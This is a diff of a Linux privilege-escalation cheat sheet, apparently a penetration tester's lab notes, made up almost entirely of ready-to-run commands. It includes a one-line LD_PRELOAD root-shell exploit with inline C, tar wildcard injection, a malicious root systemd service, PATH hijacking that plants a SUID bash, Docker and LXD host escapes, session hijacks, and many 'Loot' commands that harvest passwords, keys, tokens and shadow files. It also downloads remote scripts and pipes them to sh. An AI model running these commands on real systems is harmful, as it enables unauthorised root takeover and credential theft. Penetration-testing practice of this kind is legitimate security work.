@@ -2,62 +2,149 @@
 ^Priv Esc notes:Once inside the victim machine, check netstat -tupln to see locally running services
 ^Priv Esc notes:Kernel exploits searchsploit
 ^Priv Esc notes:SUID/SGID binaries find / -perm -4000 -type f 2>/dev/null
-^Priv Esc notes:Misconfigured sudoers or cron jobs. Remember that crontab  and /etc/cron.* can run scheduled task
+^Priv Esc notes:Misconfigured sudoers or cron jobs. Remember that crontab and /etc/cron.* can run scheduled task
 ^Priv Esc notes:Password reuse (from .ssh, history, config files)
 ^Priv Esc notes:check .bash_history and other files. Always use ls -la
 ^Priv Esc notes:use pspy to monitor linux processes after foothold
-^LinPEAS Execution:./linpeas.sh | tee <filename1> # target-machine
-^SUID Files:find / -perm -4000 -type f 2>/dev/null # target-machine
-^SUID Files:find / -perm -4000 -ls 2>/dev/null # target-machine
-^SUID Files:find / -type f -perm -4000 2>/dev/null | sed 200q # enumerate SUID binaries for GTFOBins privesc; target-machine
-^SGID Files:find / -perm -2000 -type f 2>/dev/null # target-machine
-Cron List:ls -lah /etc/cron* # target-machine
-Cron List:crontab -l # target-machine
-Cron List:cat /etc/crontab # target-machine
-^Process Monitoring:timeout 180 ./pspy64 # target-machine
-Credential pattern hunting across whole FS with context lines + file tagging:grep -RHi -n -C 2 "pass\|pwd\|key\|secret\|cred" / 2>/dev/null | sed 200q | while read l; do echo "[!] $l"; done # target-machine
-linux ADS-like file enum:find / -type f -name "*:*" 2>/dev/null | sed 200q # target-machine
-linux small-file loot grep:find / -type f -size -5k -exec grep -qi "proof\|flag\|password" {} \; -print 2>/dev/null | sed 200q # target-machine
-linux recursive cred/flag grep:grep -RHi "proof\|local.txt\|flag\|pass\|cred" / 2>/dev/null | sed 300q # target-machine
-linux proc root cmdline sweep:for f in $(ls /proc 2>/dev/null); do [ -f /proc/$f/cmdline ] && echo "[PROC:$f]$(tr -d '\0' < /proc/$f/cmdline)" | grep -qi "root"; done 2>/dev/null | sed 200q # target-machine
-linux log loot string grep:strings /var/log/* 2>/dev/null | grep -i "pass\|token\|cred\|proof" | sed 200q # target-machine
-linux home dir deep file loot:for d in /home/*; do echo "[HOME]$d"; find $d -maxdepth 4 -type f -exec grep -qi "proof\|flag\|password\|kdbx" {} \; -print 2>/dev/null; done # target-machine
-linux home-dir loot sweep with output cap:for d in /home/*; do echo "[HOME]$d"; find $d -maxdepth 4 -type f -exec grep -qi 'proof|flag|password|kdbx' {} ; -print 2>/dev/null | sed 100q; done # home-dir loot sweep with output cap; target-machine
-linux opt backup/cred tag grep:ls -laR /opt 2>/dev/null | grep -i "backup\|cred\|flag\|proof" | sed 200q # target-machine
-linux multi-extension loot find:find / -name "*.bak" -o -name "*.old" -o -name "*.backup" -o -name "*.conf" -o -name "*.kdbx" -o -name "*.key" 2>/dev/null | sed 200q # target-machine
-linux sensitive artifact discovery:find / \( -name "*.bak" -o -name "*.old" -o -name "*.backup" -o -name "*.conf" -o -name "*.kdbx" -o -name "*.key" -o -name "*.key" \) 2>/dev/null | sed 200q # target-machine
-curl:curl --unix-socket /var/run/docker.sock http://localhost/containers/json 2>/dev/null # if docker.sock exposed, list containers for breakout/pivot
-docker:docker run --rm -v /:/mnt alpine sh -c "grep -RHi 'flag|proof|password' /mnt 2>/dev/null | sed 200q" # search host filesystem from container if docker run allowed
-bash:for p in $(ls /proc 2>/dev/null); do [ -f /proc/$p/cmdline ] && echo "[PROC:$p] $(tr -d '\0' < /proc/$p/cmdline)" | grep -i "root"; done 2>/dev/null | sed 200q # spot root-run processes/args leaking creds/paths
-strings:strings /var/log/* 2>/dev/null | grep -i "pass|token|cred|proof" | sed 200q # scrape logs for secrets/flags quickly
-ls:ls -laR /opt 2>/dev/null | grep -i "backup|cred|flag|proof" | sed 200q # /opt often stores app code/backups/secrets
-grep:grep -RHi "domain admin proof pass" /etc 2>/dev/null | sed 200q # hunt domain/cred strings in configs
-Sudo privilege enumeration:sudo -l # list commands the current user can execute via sudo (with or without password) to identify privilege escalation paths; target-machine
-Port Usage Check (Linux):sudo lsof -i :<port> #identify process using specific TCP/UDP port; kali-machine
-Local Privilege Escalation (User / Root Switch):su - <user> #switch to specified user account with full login shell; target-machine
-Local Privilege Escalation (User / Root Switch):sudo su root #switch to root user using sudo privileges; target-machine
-Local Privilege Escalation (User / Root Switch):sudo su - #switch to root with login shell environment; target-machine
-LD_PRELOAD Check:sudo -l | grep -i "env_keep.*LD_PRELOAD" # check if LD_PRELOAD preserved in sudo; target-machine
-LD_PRELOAD Exploit:# Create malicious library: gcc -shared -fPIC -o /tmp/lib.so shell.c -nostartfiles; target-machine
-LD_PRELOAD Execution:sudo LD_PRELOAD=/tmp/lib.so <sudo_allowed_command> # execute with root privileges; target-machine
-Kernel Modules (list loaded):lsmod # list loaded kernel modules; target-machine
-Kernel Modules (module info):modinfo <module_name> # get info about kernel module; target-machine
-Kernel Modules (alternative):cat /proc/modules # alternative module listing; target-machine
-Cron Wildcard Abuse (create malicious script):echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" > /tmp/run.sh; chmod +x /tmp/run.sh # create malicious script; target-machine
-Cron Wildcard Abuse (checkpoint files):touch /tmp/--checkpoint=1; touch /tmp/--checkpoint-action=exec=sh\ run.sh # create tar checkpoint files for wildcard abuse; target-machine
-Systemd Timers (list):systemctl list-timers --all # list all systemd timers; target-machine
-Systemd Timers (writable units):find /etc/systemd/system -writable -type f 2>/dev/null # find writable systemd unit files; target-machine
-Systemd Timers (writable units system):find /usr/lib/systemd/system -writable -type f 2>/dev/null # find writable systemd unit files; target-machine
-PAM Configuration (nullok check):cat /etc/pam.d/* | grep -v "^#" | grep -i "nullok" # find nullok pam config (allows empty passwords); target-machine
-PAM Configuration (writable):find /etc/pam.d -writable -type f 2>/dev/null # find writable PAM configs; target-machine
-loot:find / -name shadow -readable 2>/dev/null -exec ls -la {} \; # find all readable shadow files; target-machine
-loot:find /home -name ".netrc" -exec cat {} \; 2>/dev/null # find all .netrc files (FTP/curl auto-login); target-machine
-loot:find / -name ".git-credentials" 2>/dev/null -exec cat {} \; # find all .git-credentials files; target-machine
-loot:find / -name ".env" -o -name "env" -o -name "*.env.*" 2>/dev/null # find all .env files (environment variables often contain secrets); target-machine
-loot:find / -name "composer.json" -exec grep -i "password\|pass\|db\|pwd" {} \; 2>/dev/null # find all composer.json files (PHP - may contain DB creds); target-machine
-loot:find / -name "wp-config.php" -exec grep -i "DB_USER\|DB_PASSWORD" {} \; 2>/dev/null # find all wp-config.php (WordPress config with DB creds); target-machine
-loot:find / -name "config.php" -o -name "configuration.php" -exec grep -i "password\|pass\|user" {} \; 2>/dev/null # find all config.php files; target-machine
-loot:cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i "key\|token\|secret\|password" | sort -u # extract environment variables from /proc; target-machine
-loot:find /home -name "*.gpg" -o -name "
+^Priv Esc notes:THE 30-MINUTE RULE - If you've been trying a specific escalation path for 30 minutes with no progress, STOP. Re-enumerate, look for something you missed, and move on. Don't get stuck in a rabbit hole.
+^Priv Esc notes:LD_PRELOAD with sudo - If sudo -l shows env_keep+=LD_PRELOAD, you can often escalate to root.
+^Priv Esc notes:Writable .service files - Check if you can modify systemd service files that run as root.
+^Priv Esc notes:PATH hijacking in cron jobs - If a cron job runs a script without full paths, you might be able to hijack it by creating a malicious executable earlier in the PATH.
+^Reminder:Start with automated enum to save time and not miss obvious misconfigs → run: LinPEAS
+^Reminder:If you want a second opinion / different checks, run LSE as well → run: Linux Smart Enum
+^Reminder:If you have a shell, enumerate users/groups/home dirs early for loot and sudo targets → run: User Enum
+^Reminder:Check network posture (listening services, routes, interfaces) for local-only pivots → run: Network Enum
+^Reminder:If something looks like a cron/service is executing, monitor processes in real time → run: Process Monitoring
+^Reminder:Check sudo permissions next; it often gives instant privesc paths → run: Sudo
+^Reminder:If sudo allows LD_PRELOAD / env tricks, test that route → run: Sudo LD_PRELOAD
+^Reminder:Enumerate SUID binaries for GTFOBins paths → run: SUID
+^Reminder:Enumerate SGID binaries for group-based escalation paths → run: SGID
+^Reminder:If file capabilities are used, enumerate and exploit them → run: Capabilities
+^Reminder:If you suspect cap_setuid/cap_dac_* etc on binaries, verify with focused capability checks → run: SUID Capabilities
+^Reminder:Enumerate cron jobs and writable scripts/paths → run: Cron
+^Reminder:If cron uses wildcards in writable dirs, test wildcard injection → run: Cron Wildcard
+^Reminder:Check kernel/version and search for matching local privesc exploits → run: Kernel Info
+^Reminder:Enumerate filesystem for writable dirs, creds, backups, keys → run: File System Enum
+^Reminder:If docker is present and you are in docker group, escalate via docker mount tricks → run: Docker
+^Reminder:If you can escape from docker container context, try known escape patterns → run: Docker Escape
+^Reminder:If LXC/LXD is present and you are in lxd group, use container escalation → run: LXC/LXD
+^Reminder:If LXC/LXD escalation is possible, run the escape steps → run: LXC/LXD Escape
+^Reminder:If systemd timers exist, inspect for writable units/scripts → run: Systemd Timers
+^Reminder:If PAM configs are weak/misconfigured, enumerate PAM-related privilege paths → run: PAM
+^Reminder:If NFS is exposed locally or mounted with weak options, enumerate mounts → run: NFS
+^Reminder:If you can access tmux/screen sessions, hijack them for escalation → run: Tmux/Screen
+^Reminder:If tmux sockets are accessible, attempt tmux hijack → run: Tmux Hijack
+^Reminder:If screen sockets are accessible, attempt screen hijack → run: Screen Hijack
 
-
+LinPEAS:./linpeas.sh | tee <filename1> # Run LinPEAS privilege escalation checker. Review output for highlighted findings; target-machine
+LinPEAS:curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh # Download and run in one line; target-machine
+LinPEAS:python -m http.server 80 && wget http://<kali>/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh # Download and run from Kali; target-machine
+Linux Smart Enum:(curl -fsSL https://lse.sh 2>/dev/null || wget -qO- https://lse.sh)
+Linux Smart Enum:./lse.sh # Linux Smart Enumeration. Run with -l for level 1, -l2 for level 2; target-machine
+Linux Smart Enum:./lse.sh -l2 -i # Level 2 with interactive prompts; target-machine
+SUID:find / -perm -4000 -type f 2>/dev/null # Find SUID binaries. Check GTFOBins for exploitation; target-machine
+SUID:find / -perm -4000 -ls 2>/dev/null # SUID with detailed listing; target-machine
+SUID:find / -type f -perm -4000 2>/dev/null | sed 200q # enumerate SUID binaries with output cap; target-machine
+SUID:find / -type f -perm -4000 2>/dev/null | xargs ls -la # SUID with permissions; target-machine
+SGID:find / -perm -2000 -type f 2>/dev/null # Find SGID binaries; target-machine
+SUID Capabilities:find / -type f -perm -4000 -exec getcap {} \; 2>/dev/null # Check capabilities on SUID files; target-machine
+Capabilities:getcap -r / 2>/dev/null # Find all files with capabilities. Look for interesting binaries; target-machine
+Capabilities:getcap /usr/bin/* 2>/dev/null | grep -i cap # Check common binaries for capabilities; target-machine
+Capabilities:capsh --print # Print current capabilities; target-machine
+Sudo:sudo -l # List sudo permissions. Look for NOPASSWD entries and exploitable commands; target-machine
+Sudo:sudo -l | grep -i "env_keep.*LD_PRELOAD" # Check if LD_PRELOAD preserved in sudo; target-machine
+Sudo:sudo <command> # Run command with sudo if allowed; target-machine
+Sudo LD_PRELOAD # 1:gcc -shared -fPIC -o /tmp/lib.so shell.c -nostartfiles && sudo LD_PRELOAD=/tmp/lib.so <sudo_allowed_command> # LD_PRELOAD exploit; target-machine
+Sudo LD_PRELOAD # 2:sudo -l | grep env_keep.*LD_PRELOAD # Check if LD_PRELOAD is preserved in sudo; target-machine
+Sudo LD_PRELOAD # 2:gcc -shared -fPIC -o /tmp/lib.so -x c - <<< $'# include <stdio.h>\n# include <sys/types.h>\n# include <stdlib.h>\nvoid _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); }' && sudo LD_PRELOAD=/tmp/lib.so <sudo_allowed_command> # Compile and run LD_PRELOAD exploit in one line; target-machine
+Sudo LD_PRELOAD:https://medium.com/@hemparekh1596/ld-preload-and-dynamic-library-hijacking-in-linux-237943abb8e0
+Cron:cat /etc/crontab # View system crontab. Look for jobs running as root; target-machine
+Cron:ls -la /etc/cron.d/ # Check cron.d directory; target-machine
+Cron:ls -la /etc/cron.daily/ # Check daily cron jobs; target-machine
+Cron:ls -la /etc/cron.hourly/ # Check hourly cron jobs; target-machine
+Cron:ls -la /etc/cron.weekly/ # Check weekly cron jobs; target-machine
+Cron:ls -la /etc/cron.monthly/ # Check monthly cron jobs; target-machine
+Cron:crontab -l # List current user's crontab; target-machine
+Cron Wildcard:echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" > /tmp/run.sh && touch /tmp/--checkpoint=1 && touch /tmp/--checkpoint-action=exec=sh\ run.sh # Tar wildcard abuse; target-machine
+Process Monitoring:timeout 60 ./pspy64 # Monitor processes for 60 seconds. Look for cron jobs or other scheduled tasks; target-machine
+Process Monitoring:./pspy64 -pf -i 1000 # Monitor with process flags and 1 second interval; target-machine
+Process Monitoring:watch -n 1 'ps aux | grep -v ps' # Quick process monitoring with watch; target-machine
+Network Enum:netstat -tulpn # List listening ports. Look for local-only services; target-machine
+Network Enum:ss -tulpn # Alternative to netstat; target-machine
+Network Enum:lsof -i :<port> # Check what's running on specific port; target-machine
+User Enum:id # Show current user and groups; target-machine
+User Enum:whoami # Current username; target-machine
+User Enum:cat /etc/passwd # List all users; target-machine
+User Enum:cat /etc/group # List all groups; target-machine
+User Enum:lastlog # Last login information for users; target-machine
+User Enum:last # Login history; target-machine
+User Enum:w # Who is logged in and what they're doing; target-machine
+Kernel Info:uname -a # Kernel version and architecture. Searchsploit for exploits; target-machine
+Kernel Info:cat /etc/issue # OS distribution; target-machine
+Kernel Info:cat /etc/os-release # Detailed OS info; target-machine
+Kernel Info:lsb_release -a # LSB release info; target-machine
+File System Enum:find / -writable -type d 2>/dev/null | head -50 # Find world-writable directories; target-machine
+File System Enum:find / -type f -name ".*" -exec ls -la {} \; 2>/dev/null # Find hidden files; target-machine
+File System Enum:ls -la /tmp/ /var/tmp/ /dev/shm # Check temp directories for interesting files; target-machine
+File System Enum:mount # List mounted filesystems; target-machine
+File System Enum:df -h # Disk usage; target-machine
+File System Enum:lsblk # Block device information; target-machine
+Docker:find / -name "docker.sock" 2>/dev/null # Find Docker socket. If writable, can escape container; target-machine
+Docker:docker ps # List running containers if in docker group; target-machine
+Docker Escape:docker run -v /:/mnt -it alpine chroot /mnt /bin/sh # Escape to host if docker socket accessible; target-machine
+Docker Escape:docker run --privileged -it alpine chroot /host /bin/bash # Privileged container escape; target-machine
+LXC/LXD:lxc list # List containers if in lxd group; target-machine
+LXC/LXD Escape:lxc init ubuntu:16.04 test -c security.privileged=true && lxc config device add test mydevice disk source=/ path=/mnt/root recursive=true && lxc start test && lxc exec test /bin/sh # LXD privilege escalation; target-machine
+Systemd Timers:systemctl list-timers --all # List all systemd timers; target-machine
+Systemd Timers:find /etc/systemd/system -writable -type f 2>/dev/null # Find writable systemd unit files; target-machine
+Systemd Timers:find /usr/lib/systemd/system -writable -type f 2>/dev/null # Find writable systemd system files; target-machine
+PAM:cat /etc/pam.d/* | grep -v "^# " | grep -i "nullok" # Find nullok pam config (allows empty passwords); target-machine
+PAM:find /etc/pam.d -writable -type f 2>/dev/null # Find writable PAM configs; target-machine
+NFS:showmount -e <target> # Show NFS exports from remote; kali-machine
+NFS:mount -t nfs <target>:/ /mnt/nfs # Mount NFS share; kali-machine
+NFS:cat /etc/exports # Check local NFS exports; target-machine
+Tmux/Screen:ps aux | grep tmux # Look for tmux sessions; target-machine
+Tmux/Screen:ps aux | grep screen # Look for screen sessions; target-machine
+Tmux Hijack:tmux attach -t <session> # Attach to tmux session if permissions allow; target-machine
+Screen Hijack:screen -x <user>/<session> # Attach to screen session; target-machine
+Loot:grep -rli "password\|pass\|pwd\|cred" /home/ 2>/dev/null # Search home directories for credentials; target-machine
+Loot:grep -rli "password\|pass\|pwd\|cred" /etc/ 2>/dev/null # Search etc for credentials; target-machine
+Loot:grep -rli "password\|pass\|pwd\|cred" /var/www/ 2>/dev/null # Search web root for credentials; target-machine
+Loot:find / -name ".bash_history" -exec grep -i "pass\|ssh\|mysql\|psql" {} \; 2>/dev/null # Search history files; target-machine
+Loot:find / -name ".git-credentials" -exec cat {} \; 2>/dev/null # Find git credentials; target-machine
+Loot:find / -name ".env" -exec cat {} \; 2>/dev/null # Find environment variable files; target-machine
+Loot:find / -name "wp-config.php" -exec grep -i "DB_USER\|DB_PASSWORD" {} \; 2>/dev/null # Find WordPress configs; target-machine
+Loot:find / -name "config.php" -exec grep -i "password\|pass\|user" {} \; 2>/dev/null # Find PHP configs; target-machine
+Loot:strings /var/log/* 2>/dev/null | grep -i "password\|pass\|cred" # Search logs for credentials; target-machine
+Loot:grep -RHi -n -C 2 "pass\|pwd\|key\|secret\|cred" / 2>/dev/null | sed 200q | while read l; do echo "[!] $l"; done # Hunt credentials across filesystem; target-machine
+Loot:find / -type f -name "*:*" 2>/dev/null | sed 200q # Find files with ADS-like names; target-machine
+Loot:find / -type f -size -5k -exec grep -qi "proof\|flag\|password" {} \; -print 2>/dev/null | sed 200q # Grep small files for flags; target-machine
+Loot:grep -RHi "proof\|local.txt\|flag\|pass\|cred" / 2>/dev/null | sed 300q # Recursive cred/flag grep; target-machine
+Loot:for f in $(ls /proc 2>/dev/null); do [ -f /proc/$f/cmdline ] && echo "[PROC:$f]$(tr -d '\0' < /proc/$f/cmdline)" | grep -qi "root"; done 2>/dev/null | sed 200q # Spot root processes; target-machine
+Loot:strings /var/log/* 2>/dev/null | grep -i "pass\|token\|cred\|proof" | sed 200q # Scrape logs for secrets; target-machine
+Loot:for d in /home/*; do echo "[HOME]$d"; find $d -maxdepth 4 -type f -exec grep -qi "proof\|flag\|password\|kdbx" {} \; -print 2>/dev/null; done # Hunt in home directories; target-machine
+Loot:for d in /home/*; do echo "[HOME]$d"; find $d -maxdepth 4 -type f -exec grep -qi 'proof|flag|password|kdbx' {} ; -print 2>/dev/null | sed 100q; done # Home hunt with output cap; target-machine
+Loot:ls -laR /opt 2>/dev/null | grep -i "backup\|cred\|flag\|proof" | sed 200q # Check /opt for backups; target-machine
+Loot:find / -name "*.bak" -o -name "*.old" -o -name "*.backup" -o -name "*.conf" -o -name "*.kdbx" -o -name "*.key" 2>/dev/null | sed 200q # Find backup/config files; target-machine
+Loot:find / \( -name "*.bak" -o -name "*.old" -o -name "*.backup" -o -name "*.conf" -o -name "*.kdbx" -o -name "*.key" -o -name "*.key" \) 2>/dev/null | sed 200q # Find sensitive artifacts; target-machine
+Loot:cat /etc/shadow # Read shadow file if readable; target-machine
+Loot:cat /etc/passwd # Read passwd file; target-machine
+Loot:find / -name shadow -readable 2>/dev/null -exec cat {} \; # Find readable shadow files; target-machine
+Loot:find / -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null # Find backup files; target-machine
+Loot:find / -name "id_rsa*" -o -name "*.pem" 2>/dev/null # Find SSH private keys; target-machine
+Loot:find /home -name "*.gpg" -o -name "*.asc" 2>/dev/null # Find GPG keys; target-machine
+Loot:find /home -name ".netrc" -exec cat {} \; 2>/dev/null # Find .netrc files with credentials; target-machine
+Inotify:ps aux | grep inotify # Find processes monitoring file changes; target-machine
+Inotify:inotifywait -m /path/to/watch # Manually monitor directory for changes; target-machine
+Python Hijacking:python3 -c "import sys; print(sys.path)" # Show Python module search path; target-machine
+Python Hijacking:find /usr/local/lib/python*/dist-packages/ -writable -type f 2>/dev/null # Find writable Python site-packages; target-machine
+Python Hijacking:find /home -name "*.py" -writable 2>/dev/null # Find writable Python scripts; target-machine
+Kernel Modules:lsmod # List loaded kernel modules; target-machine
+Kernel Modules:modinfo <module_name> # Get info about kernel module; target-machine
+Kernel Modules:cat /proc/modules # Alternative module listing; target-machine
+Writable Services:find /etc/systemd/system -writable -type f 2>/dev/null # Find writable systemd service files; target-machine
+Writable Services Exploit:echo -e '[Unit]\nDescription=Root Service\n\n[Service]\nType=oneshot\nExecStart=/bin/bash -c "chmod +s /bin/bash"\nUser=root\n\n[Install]\nWantedBy=multi-user.target' > /tmp/root.service && cp /tmp/root.service /etc/systemd/system/ && systemctl start root.service # Create and trigger malicious service; target-machine
+PATH Hijacking:cat /etc/crontab | grep -v "^# " # Check cron jobs for scripts without full paths; target-machine
+PATH Hijacking Exploit:echo '# !/bin/bash' > /tmp/ls && echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/ls && chmod +x /tmp/ls && export PATH=/tmp:$PATH # Create malicious ls and add to PATH; target-machine
+PATH Hijacking Wait:# Wait for cron to execute, then run: /tmp/rootbash -p; target-machine
+TAR wildcards:https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa
